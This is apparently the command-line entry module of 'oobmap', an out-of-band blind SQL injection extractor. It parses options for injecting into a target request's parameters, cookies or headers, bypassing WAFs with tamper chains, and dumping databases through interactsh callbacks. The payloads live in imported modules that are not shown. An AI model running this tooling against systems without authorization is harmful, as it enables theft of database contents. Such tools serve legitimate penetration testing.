import argparse
import datetime
import string
import sys

from . import __version__
from .core.formatting import (
    split_dump_row,
    print_dump_row,
    print_dump_table,
    format_table,
    format_json,
    format_csv,
)
from .payloads import PROFILES
from .tamper import TAMPERS
from .utils.logging import _log


DEFAULT_ALPHABET = string.ascii_lowercase + string.digits
ENUM_ALPHABET = string.ascii_letters + string.digits + " _-.:/@()[]{}+,;=<>|"


from .core.detection import normalize_domain, _detect_dbms, _DETECT_ORDER, _DBMS_DISPLAY


from .core.actions import (
    build_expression,
    run_check,
    check,
    extract,
    dump,
    enum,
    enumerate_rows,
    _table_exists,
    validate_dump_target,
    get_or_enumerate_catalog,
    save_catalog_values,
    flush_session_once,
)


_ENUM_KEYS = ("dbs", "banner", "current_user", "current_db", "tables", "columns")

# Alias map: accepts shorthand/case-insensitive names → canonical profile
_DBMS_ALIASES = {
    "sqlite":     "sqlite-http",
    "postgres":   "postgres-program",
    "postgresql": "postgres-program",
    "oracle":     "oracle-http",
    "sqlserver":  "mssql",
    "mariadb":    "mysql",
}


def _resolve_dbms(value: str) -> str:
    """Normalize --dbms: lowercase + alias resolution. Returns the canonical profile name."""
    low = value.lower()
    return _DBMS_ALIASES.get(low, low)


def _validate_action_flags(args, is_enum: bool) -> None:
    if getattr(args, "check", False) and (args.expr or is_enum):
        raise SystemExit("--check cannot be combined with --expr/--dump/enum flags")


def run(args) -> int:
    if getattr(args, "enum_all", False):
        args.dbs = args.banner = args.current_user = args.current_db = True

    if not getattr(args, "request", None):
        raise SystemExit("the following argument is required: -r/--request")

    if not getattr(args, "domain", None) or not getattr(args, "log", None):
        missing = "--domain" if not getattr(args, "domain", None) else "--log"
        _log("WARNING", f"{missing} is required", err=True)
        _log("INFO",
             "launch interactsh client first:\n\n"
             "    interactsh-client -json -o interactsh.jsonl\n\n"
             "  then run oobmap with:\n"
             "    --domain <your-cid>.oast.site --log interactsh.jsonl",
             err=True)
        raise SystemExit(1)

    if not args.dbms:
        args.dbms = _detect_dbms(args)
        if not args.dbms:
            raise SystemExit(
                "could not auto-detect DBMS — no OOB callback received for any engine. "
                "Specify --dbms explicitly or check your --domain/--log setup."
            )
    elif args.dbms not in PROFILES:
        raise SystemExit(
            f"[ERROR] unknown --dbms value: '{args.dbms}'. "
            f"Valid profiles: {', '.join(sorted(PROFILES))}. "
            "Aliases accepted: sqlite, postgres, oracle, sqlserver, mariadb."
        )

    is_enum = any(getattr(args, k, False) for k in _ENUM_KEYS) or getattr(args, "dump", False)
    _validate_action_flags(args, is_enum)
    if args.alphabet is None:
        args.alphabet = ENUM_ALPHABET if is_enum else DEFAULT_ALPHABET
    if args.max_len is None:
        args.max_len = 120 if is_enum else 40

    if args.expr:
        return extract(args)
    if args.dump:
        return dump(args)
    if is_enum:
        return enum(args)
    return check(args)


_ART = [
    "     ___  ___  ___  __  __   _   ___",
    "    / _ \\/ _ \\| _ )|  \\/  | /_\\ | _ \\",
    "   | (_) | (_) | _ \\ |\\/| |/ _ \\|  _/",
    f"    \\___/ \\___/|___/_|  |_/_/ \\_\\_|    {{v{__version__}}}",
]
_SUBTITLE = "    OOB blind SQLi extractor — powered by interactsh"


def _banner() -> str:
    if sys.stdout.isatty():
        c  = "\033[1;36m"   # bold cyan  — logo
        v  = "\033[1;33m"   # bold yellow — version tag
        s  = "\033[0;37m"   # light grey  — subtitle
        r  = "\033[0m"
        art = "\n".join(
            # color the version tag separately on the last art line
            line.replace(f"{{v{__version__}}}", f"{r}{v}{{v{__version__}}}{r}{c}")
            .join([c, r])
            for line in _ART
        )
        return f"\n{art}\n\n{s}{_SUBTITLE}{r}\n"
    return "\n" + "\n".join(_ART) + f"\n\n{_SUBTITLE}\n"


def _starting_line() -> str:
    now = datetime.datetime.now()
    ts   = now.strftime("%H:%M:%S")
    date = now.strftime("%Y-%m-%d")
    if sys.stdout.isatty():
        star = "\033[1;36m[*]\033[0m"
    else:
        star = "[*]"
    return f"{star} starting @ {ts} /{date}/\n"


def _ending_line() -> str:
    now = datetime.datetime.now()
    ts   = now.strftime("%H:%M:%S")
    date = now.strftime("%Y-%m-%d")
    if sys.stdout.isatty():
        star = "\033[1;36m[*]\033[0m"
    else:
        star = "[*]"
    return f"\n{star} ending @ {ts} /{date}/\n"


class _Formatter(argparse.RawDescriptionHelpFormatter):
    def _format_usage(self, usage, actions, groups, prefix):
        return f"Usage: {self._prog} [options]\n\n"


def make_parser():
    parser = argparse.ArgumentParser(
        prog="oobmap",
        description=None,
        formatter_class=_Formatter,
    )
    parser.add_argument("--version", action="version", version=f"oobmap {__version__}")
    parser.set_defaults(func=run)

    sub = parser.add_subparsers(dest="command")
    sub.add_parser("profiles", help="list payload profiles").set_defaults(func=profiles)
    sub.add_parser("tampers",  help="list available WAF tamper scripts").set_defaults(func=list_tampers)

    tgt = parser.add_argument_group("Target")
    tgt.add_argument("-r", "--request", metavar="FILE", help="raw HTTP request file")
    tgt.add_argument("-p", "--param", help="parameter/cookie/header name to inject")
    tgt.add_argument(
        "--place",
        choices=["auto", "cookie", "query", "body", "header", "marker", "json"],
        default="auto",
        help="injection place (default: auto); json targets a dotted JSONPath e.g. user.name",
    )
    tgt.add_argument("--dbms", type=_resolve_dbms, metavar="DBMS",
                     help=f"target DBMS — profiles: {', '.join(sorted(PROFILES))}; "
                          "aliases: sqlite, postgres, oracle, sqlserver, mariadb (case-insensitive)")
    tgt.add_argument("-D", "--database", help="database/schema/catalog for metadata and dump queries")

    oob = parser.add_argument_group("OOB callback")
    oob.add_argument("--domain", help="interactsh collaborator domain")
    oob.add_argument("--log", action="append", metavar="PATH",
                     help="interactsh JSONL log file (repeat: --log a.jsonl --log b.jsonl)")
    oob.add_argument("--timeout", type=float, default=8.0,
                     help="seconds to wait for a callback per probe/position (default: 8)")

    enm = parser.add_argument_group("Enumeration")
    enm.add_argument("-a", "--all", action="store_true", dest="enum_all",
                     help="retrieve everything: banner, current-user, current-db, dbs")
    enm.add_argument("-b", "--banner", action="store_true", help="retrieve DBMS version banner")
    enm.add_argument("--current-user", action="store_true", help="retrieve current database user")
    enm.add_argument("--current-db",   action="store_true", help="retrieve current database/schema name")
    enm.add_argument("--dbs",     action="store_true", help="enumerate accessible databases/schemas")
    enm.add_argument("--tables",  action="store_true", help="enumerate table names")
    enm.add_argument("--columns", action="store_true", help="enumerate column names (requires -T)")
    enm.add_argument("--dump",    action="store_true", help="dump table entries (use with -T/-C/--where)")
    enm.add_argument("--expr", help="raw scalar SQL expression to extract via OOB")
    enm.add_argument("-T", "--table",  help="target table")
    enm.add_argument("-C", "--column", metavar="COL", help="comma-separated column(s) to dump")
    enm.add_argument("--where", help="SQL WHERE clause, e.g. \"username='admin'\"")
    enm.add_argument("--limit",      type=int, default=20, help="max rows/items to fetch (default: 20)")
    enm.add_argument("--enum-limit", type=int, default=50,
                     help="max tables/columns to enumerate during dump validation (default: 50)")
    enm.add_argument("--validate",    dest="validate", action="store_true",  default=True,
                     help="confirm table/columns before dumping (default)")
    enm.add_argument("--no-validate", dest="validate", action="store_false",
                     help="skip catalog validation; requires -C")

    det = parser.add_argument_group("Detection")
    det.add_argument("--check", action="store_true",
                     help="explicitly run OOB verification (default action when no "
                          "--expr/--dump/enum flag is given)")
    det.add_argument("--level", type=int, choices=range(1, 6), default=1,
                     help="auto-scan depth (no -p): 1=query+body, 2=+cookies, 3=+headers, 5=all (default: 1)")
    det.add_argument("--risk", type=int, choices=(1, 2, 3), default=2,
                     help="payload variants tried within the selected profile: "
                          "1=minimal/stealthy (one variant), "
                          "2=default fallback set, "
                          "3=adds comment-terminator variants for stubborn targets "
                          "(never changes DBMS/profile or enables stacked/cmdshell/dblink) "
                          "(default: 2)")
    det.add_argument("--true-condition",  default="1=1",
                     help="true SQL condition for check probes (default: 1=1)")
    det.add_argument("--false-condition", default="1=2",
                     help="false SQL condition for check probes (default: 1=2)")
    det.add_argument("--first", action="store_true",
                     help="stop after first confirmed OOB point (check mode)")

    ext = parser.add_argument_group("Extraction")
    ext.add_argument("--strategy", choices=["batch", "binary"], default="batch",
                     help="batch: one request per char (default); binary: ~10x fewer requests")
    ext.add_argument("--threads", type=int, default=1, metavar="N",
                     help="extract N positions in parallel (default: 1; recommended range: 2-4)")
    ext.add_argument("--alphabet", default=None,
                     help=f"chars to test per position (default: a-z0-9 for extract/dump, extended for enum)")
    ext.add_argument("--max-len", type=int, default=None,
                     help="max value length (default: 40 for extract/dump, 120 for enum)")

    waf = parser.add_argument_group("WAF bypass")
    waf.add_argument("--tamper", default="", metavar="NAMES",
                     help="comma-separated tamper chain — run 'oobmap tampers' for the list")
    waf.add_argument("--payload-suffix", action="append", metavar="SQL",
                     help="also try generated payloads with this custom SQL suffix; repeatable")

    net = parser.add_argument_group("Network")
    net.add_argument("--force-ssl",    action="store_true", help="send request over HTTPS")
    net.add_argument("--http-timeout", type=float, default=10.0,
                     help="HTTP response timeout in seconds (default: 10)")
    net.add_argument("--proxy", metavar="URL",
                     help="proxy URL — http://host:port (SOCKS5 requires PySocks)")
    net.add_argument("--no-verify-ssl", action="store_true", help="skip TLS certificate verification")
    net.add_argument("--base", help="original parameter value before injection")

    out = parser.add_argument_group("Output")
    out.add_argument("--output-format", choices=["table", "json", "csv"], default="table",
                     dest="output_format", help="dump output format (default: table)")
    out.add_argument("--output-file", metavar="PATH",
                     help="write dump output to file (progress stays on stderr)")

    sess = parser.add_argument_group("Session")
    sess.add_argument("--output-dir",
                      help="session/output directory (default: ~/.local/share/oobmap/output)")
    sess.add_argument("--flush-session",  action="store_true",
                      help="flush session files for current target")
    sess.add_argument("--fresh-queries",  action="store_true",
                      help="ignore cached results without deleting the session")
    sess.add_argument("--run-id", help="fix run ID for reproducible token debugging")

    misc = parser.add_argument_group("Misc")
    misc.add_argument("--batch",    action="store_true", help="non-interactive mode (sqlmap compat)")
    misc.add_argument("-v", "--verbose", action="store_true",
                      help="print HTTP status and payload for each request")

    return parser


def list_tampers(args) -> int:
    for name, (_, description) in sorted(TAMPERS.items()):
        print(f"{name:<22} {description}")
    return 0


def profiles(args) -> int:
    for name in sorted(PROFILES):
        profile = PROFILES[name]
        print(f"{name:16} {profile.description}")
        print(f"{'':16} {profile.comment}")
    return 0


def main(argv=None):
    print(_banner(), end="", flush=True)
    parser = make_parser()
    args = parser.parse_args(argv)
    if args.command is None and not getattr(args, "request", None):
        parser.print_help()
        return 0
    print(_starting_line(), flush=True)
    try:
        rc = args.func(args)
        print(_ending_line(), flush=True)
        return rc
    except KeyboardInterrupt:
        print(_ending_line(), flush=True)
        _log("WARNING", "Interrupted", err=True)
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
